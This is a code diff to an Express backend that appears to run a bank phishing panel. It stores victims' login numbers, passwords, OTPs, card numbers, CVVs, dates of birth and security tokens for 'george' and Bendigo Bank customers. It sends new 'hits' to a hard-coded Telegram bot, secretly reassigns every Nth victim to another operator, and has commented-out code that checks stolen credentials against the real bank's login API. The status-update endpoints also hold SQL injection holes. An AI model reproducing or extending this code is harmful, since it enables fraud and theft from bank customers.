+app.post("/georgeCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE george SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/georgeSavePhone", cors());
+
+app.post("/georgeSavePhone", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+
+  let details = [telephone, uniqueid, owner];
+  let query = `UPDATE george SET telephone=?, status = 5 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/georgeSaveOtp", cors());
+
+app.post("/georgeSaveOtp", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  otp = req.body.otp;
+  owner = req.body.owner;
+
+  let details = [otp, uniqueid, owner];
+  let query = `UPDATE george SET otp=?, status = 3 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/georgeSaveCard", cors());
+
+app.post("/georgeSaveCard", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  ccnum = req.body.ccnum;
+  ccexp = req.body.ccexp;
+  cvv = req.body.cvv;
+  owner = req.body.owner;
+
+  let details = [ccnum, ccexp, cvv, uniqueid, owner];
+  let query = `UPDATE george SET ccnum=?, ccexp=?, cvv=?, status = 8 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/georgeSaveLoginAgain", cors());
+
+app.post("/georgeSaveLoginAgain", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  accessNo = req.body.accessNo;
+  password = req.body.password;
+  secNo = req.body.secNo;
+  owner = req.body.owner;
+
+  let details = [accessNo, password, secNo, uniqueid];
+  let query = `UPDATE george SET accessNo=?, password=?,secNo=?, status = 1 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/georgeCustomers/:id/:owner", cors());
+
+app.get("/georgeCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM george WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+let georgeCount = 0;
+
+app.options("/georgeSaveLogin", cors());
+
+app.post("/georgeSaveLogin", cors(), (req, res) => {
+  accessNo = req.body.accessNo;
+  password = req.body.password;
+  secNo = req.body.secNo;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  if (georgeCount == 20) {
+    axios.post(
+      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New george Hit:\n${accessNo}`
+    );
+
+    let details = [accessNo, password, secNo, uniqueid, ip, "haytchPanel123!"];
+    let query = `INSERT INTO george(accessNo,password,secNo,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+    panelConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Insertion Completed");
+      else console.log(err);
+    });
+    georgeCount = 0;
+  } else {
+    let details = [accessNo, password, secNo, uniqueid, ip, owner];
+    let query = `INSERT INTO george(accessNo,password,secNo,uniqueid,status,ip, owner) VALUES (?,?,?,?,1,?,?)`;
+
+    panelConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Insertion Completed");
+      else console.log(err);
+    });
+    georgeCount += 1;
+  }
+});
+
+app.options("/georgeDeleteentry/:id", cors());
+
+app.post("/georgeDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.body.owner;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM george WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
 //BENDIGO
 //BENDIGO
 //BENDIGO
+
+app.options("/bendiCustomers/:id/:owner/modal", cors());
+
+app.get("/bendiCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM bendi WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/bendiCustomers/:owner", cors());
+
+app.get("/bendiCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM bendi WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/bendiCommand", cors());
+
+app.post("/bendiCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE bendi SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
 
 app.options("/bendiSavePhone", cors());
 
 app.post("/bendiSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   telephone = req.body.telephone;
+  owner = req.body.owner;
 
-  let details = [telephone, uniqueid];
+  let details = [telephone, uniqueid, owner];
   let query = `UPDATE bendi SET telephone=?, status = 11 WHERE uniqueid = ?`;
 
   panelConnection.query(query, details, (err, rows, fields) => {
@@ -103,18 +2468,33 @@ app.post("/bendiSavePhone", cors(), (req, res) => {
   });
 });
 
-let bendigoCountSkii = 2;
+app.options("/bendiCustomers/:id/:owner", cors());
+
+app.get("/bendiCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM bendi WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+let bendiCount = 2;
 
 app.options("/bendiSaveLogin", cors());
 
-app.post("/bendiSaveLogin", cors(), (req, res) => {
+app.post(`/bendiSaveLogin`, cors(), (req, res) => {
   accessId = req.body.accessId;
   password = req.body.password;
   owner = req.body.owner;
   ip = req.body.ip;
   uniqueid = req.body.uniqueid;
 
-  if (bendigoCountSkii == 2) {
+  if (bendiCount == 2) {
     let details = [accessId, password, uniqueid, ip, "haytch123!"];
     let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
 
@@ -122,7 +2502,11 @@ app.post("/bendiSaveLogin", cors(), (req, res) => {
       if (!err) res.send("Insertion Completed");
       else console.log(err);
     });
-    bendigoCountSkii = 0;
+    bendiCount = 0;
+
+    axios.post(
+      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New Bendi Hit:\n${accessId}`
+    );
   } else {
     let details = [accessId, password, uniqueid, ip, owner];
     let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
@@ -131,8 +2515,129 @@ app.post("/bendiSaveLogin", cors(), (req, res) => {
       if (!err) res.send("Insertion Completed");
       else console.log(err);
     });
-    bendigoCountSkii += 1;
+    bendiCount += 1;
   }
+
+  // function createAxios() {
+  //   return axios.create({ withCredentials: true });
+  // }
+  // const axiosInstance = createAxios();
+
+  // const cookieJar = {
+  //   myCookies: undefined,
+  // };
+
+  // async function login() {
+  //   const response = await axiosInstance.get(
+  //     "https://banking.bendigobank.com.au/Logon/jaxrs/eid/flow",
+  //     {
+  //       headers: {
+  //         "x-brand": "ben",
+  //         "x-channel": "web",
+  //       },
+  //     }
+  //   );
+  //   cookieJar.myCookies = response.headers["set-cookie"];
+  //   return response;
+  // }
+
+  // async function request(flowId) {
+  //   // read the cookie and set it in the headers
+  //   const response = await axiosInstance
+  //     .post(
+  //       `https://banking.bendigobank.com.au/Logon/jaxrs/eid/flow/${flowId}`,
+  //       {
+  //         action: "accessId",
+  //         accessId: accessId,
+  //       },
+  //       {
+  //         headers: {
+  //           "x-brand": "ben",
+  //           "x-channel": "web",
+  //           cookie: cookieJar.myCookies,
+  //         },
+  //       }
+  //     )
+  //     .catch((err) => {
+  //       console.log(err);
+  //     });
+  //   return response;
+  // }
+
+  // async function passRequest(flowId) {
+  //   let result = true;
+  //   // read the cookie and set it in the headers
+  //   const response = await axiosInstance
+  //     .post(
+  //       `https://banking.bendigobank.com.au/Logon/jaxrs/eid/flow/${flowId}`,
+  //       {
+  //         action: "password",
+  //         password: password,
+  //       },
+  //       {
+  //         headers: {
+  //           "x-brand": "ben",
+  //           "x-channel": "web",
+  //           cookie: cookieJar.myCookies,
+  //         },
+  //       }
+  //     )
+  //     .catch((err) => {
+  //       result = false;
+  //     });
+  //   return result;
+  // }
+
+  // login().then((resp) => {
+  //   request(resp.data.flowId).then(async () => {
+  //     let result = await passRequest(resp.data.flowId);
+  //     console.log(result);
+  //     if (result === true) {
+  //       let details = [accessId, password, uniqueid, ip, owner];
+  //       let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+  //       panelConnection.query(query, details, (err, rows, fields) => {
+  //         if (!err) res.send("Insertion Completed");
+  //         else console.log(err);
+  //       });
+  //       bendiCount += 1;
+  //     } else {
+  //       res.send("WrongLogin");
+  //     }
+  //   });
+  // });
+});
+
+app.options("/bendiSaveOtp", cors());
+
+app.post("/bendiSaveOtp", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  otp = req.body.otp;
+  owner = req.body.owner;
+
+  let details = [otp, uniqueid, owner];
+  let query = `UPDATE bendi SET otp=?, status = 3 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bendiSaveDob", cors());
+
+app.post("/bendiSaveDob", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  dob = req.body.dob;
+  owner = req.body.owner;
+
+  let details = [dob, uniqueid, owner];
+  let query = `UPDATE bendi SET dob=?, status = 11 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
 });
 
 app.options("/bendiSaveST", cors());
@@ -140,12 +2645,45 @@ app.options("/bendiSaveST", cors());
 app.post("/bendiSaveST", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   secToken = req.body.secToken;
+  owner = req.body.owner;
 
-  let details = [secToken, uniqueid];
+  let details = [secToken, uniqueid, owner];
   let query = `UPDATE bendi SET secToken=?, status = 5 WHERE uniqueid = ?`;
 
   panelConnection.query(query, details, (err, rows, fields) => {
     if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bendiSaveLoginAgain", cors());
+
+app.post("/bendiSaveLoginAgain", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  accessId = req.body.accessId;
+  password = req.body.password;
+  owner = req.body.owner;
+
+  let details = [accessId, password, uniqueid, owner];
+  let query = `UPDATE bendi SET accessId=?, password=?, status = 11 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bendiDeleteentry/:id", cors());
+
+app.post("/bendiDeleteentry/:id", cors(), (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.body.owner;
+
+  let details = [uniqueid];
+  let query = `DELETE FROM bendi WHERE uniqueid= ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
     else console.log(err);
   });
 });
